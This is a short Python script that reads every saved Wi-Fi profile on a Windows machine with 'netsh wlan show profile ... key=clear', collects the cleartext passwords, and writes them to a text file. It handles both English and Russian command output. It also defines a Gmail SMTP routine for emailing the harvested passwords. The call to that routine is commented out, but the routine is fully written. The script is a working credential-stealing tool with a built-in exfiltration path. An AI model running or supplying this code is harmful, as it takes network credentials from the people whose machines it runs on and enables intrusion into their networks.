import re
import subprocess
import smtplib


def check_decode():
    codecs = ["cp1251", "cp1252", "windows-1251", "cp866", "utf-16be", "utf-16", "utf-8", "ASCII", "koi8-r", "latin1"]
    for code in codecs:
        print(f'\t{code}:')
        # profiles_data == <class 'bytes'>  =>  decode
        profiles_data = subprocess.check_output('netsh wlan show profiles').decode(code,
                                                                                   errors='ignore')  # .split('\n')
        print(profiles_data)


def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def extract_wifi_passwords_2():
    command = 'netsh wlan show profile'

    try:
        networks = subprocess.check_output(command, shell=True).decode("utf-8")
        networks_names_list = re.findall("(?:All user profiles\s*:\s)(.*)", networks)
        dec = 'utf-8'
    except UnicodeDecodeError:
        networks = subprocess.check_output(command, shell=True).decode('cp866')
        networks_names_list = re.findall("(?:Все профили пользователей\s*:\s)(.*)", networks)
        dec = 'cp866'

    # print(f'networks_names_list: {networks_names_list}')
    result = ''
    for network_name in networks_names_list:
        command = f'netsh wlan show profile {network_name} key=clear'
        current_result = subprocess.check_output(command, shell=True).decode(dec)
        result += current_result

    with open(file='wifi_information.txt', mode='w', encoding='utf-8') as file:
        file.write(result)

    return result


def main():
    # check_decode()
    result = extract_wifi_passwords_2()
    # send_mail('some@gmail.com', 'pass', result)
    print("\tDone!")


if __name__ == '__main__':
    main()
